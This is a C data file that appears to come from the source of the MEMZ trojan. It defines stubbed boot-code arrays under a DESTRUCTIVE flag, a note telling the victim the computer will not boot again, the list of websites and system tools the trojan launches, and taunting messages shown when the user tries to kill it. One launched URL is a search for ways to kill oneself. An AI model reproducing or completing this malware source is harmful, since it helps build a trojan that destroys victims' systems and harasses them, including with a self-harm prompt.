#include "MEMZ.h"

#ifdef DESTRUCTIVE
// BootCode Stage-1
const unsigned char Code1[] = {
	
};
// BootCode Stage-2
const unsigned char Code2[] = {
	
};
const size_t nCode1 = sizeof(Code1);
const size_t nCode2 = sizeof(Code2);
#endif

// Note
const wchar_t Note[] = {
	L"YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\n"
	L"Your computer won't boot up again,\r\n"
	L"so use it as long as you can!\r\n\r\n"
	L":D\r\n\r\n"
	L"Trying to kill MEMZ will cause your system to be\r\n"
	L"destroyed instantly, so don't try it :D"
};
const size_t nNote = sizeof(Note);

// Execute
const wchar_t *Sites[] = {
	L"http://google.co.ck/search?q=best+way+to+kill+yourself",
	L"http://google.co.ck/search?q=how+2+remove+a+virus",
	L"http://google.co.ck/search?q=mcafee+vs+norton",
	L"http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
	L"http://google.co.ck/search?q=minecraft+hax+download+no+virus",
	L"http://google.co.ck/search?q=how+to+get+money",
	L"http://google.co.ck/search?q=bonzi+buddy+download+free",
	L"http://google.co.ck/search?q=how+2+buy+weed",
	L"http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
	L"http://google.co.ck/search?q=what+happens+if+you+delete+system32",
	L"http://google.co.ck/search?q=g3t+r3kt",
	L"http://google.co.ck/search?q=batch+virus+download",
	L"http://google.co.ck/search?q=virus.exe",
	L"http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
	L"http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
	L"http://google.co.ck/search?q=virus+builder+legit+free+download",
	L"http://google.co.ck/search?q=how+to+create+your+own+ransomware",
	L"http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
	L"http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	L"http://google.co.ck/search?q=dank+memz",
	L"http://google.co.ck/search?q=how+to+download+memz",
	L"http://google.co.ck/search?q=half+life+3+release+date",
	L"http://google.co.ck/search?q=is+illuminati+real",
	L"http://google.co.ck/search?q=montage+parody+making+program+2016",
	L"http://google.co.ck/search?q=the+memz+are+real",
	L"http://google.co.ck/search?q=stanky+danky+maymays",
	L"http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
	L"http://google.co.ck/search?q=vinesauce+meme+collection",
	L"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
	L"http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
	L"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
	L"http://play.clubpenguin.com",
	L"http://pcoptimizerpro.com",
	L"http://softonic.com",
	L"calc",
	L"notepad",
	L"cmd",
	L"write",
	L"regedit",
	L"explorer",
	L"taskmgr",
	L"msconfig",
	L"mspaint",
	L"devmgmt.msc",
	L"control",
	L"mmc",
};
const size_t nSites = sizeof(Sites) / sizeof(void *);

// PlaySounds
const wchar_t *Sounds[] = {
	L"SystemHand",
	L"SystemQuestion",
	L"SystemExclamation"
};
const size_t nSounds = sizeof(Sounds) / sizeof(void *);

// KillMessages
const wchar_t *Msgs[] = {
	L"YOU KILLED MY TROJAN!\nNow you are going to die.",
	L"REST IN PISS, FOREVER MISS.",
	L"I WARNED YOU...",
	L"HAHA N00B L2P G3T R3KT",
	L"You failed at your 1337 h4x0r skillz.",
	L"YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
	L"HACKER!\nENJOY BAN!",
	L"GET BETTER HAX NEXT TIME xD",
	L"HAVE FUN TRYING TO RESTORE YOUR DATA :D",
	L"|\\/|3|\\/|2",
	L"BSOD INCOMING",
	L"VIRUS PRANK (GONE WRONG)",
	L"ENJOY THE NYAN CAT",
	L"Get dank antivirus m9!",
	L"You are an idiot!\nHA HA HA HA HA HA HA",
	L"#MakeMalwareGreatAgain",
	L"SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME",
	L"Why did you even tried to kill MEMZ?\nYour PC is fucked anyway.",
	L"SecureBoot sucks.",
	L"gr8 m8 i r8 8/8",
	L"Have you tried turning it off and on again?",
	L"<Insert Joel quote here>",
	L"Greetings to all GAiA members!",
	L"Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!",
	L"'This is everything I want in my computer'\n - danooct1 2016",
	L"'Uh, Club Penguin. Time to get banned!'\n - danooct1 2016",
};
const size_t nMsgs = sizeof(Msgs) / sizeof(void *);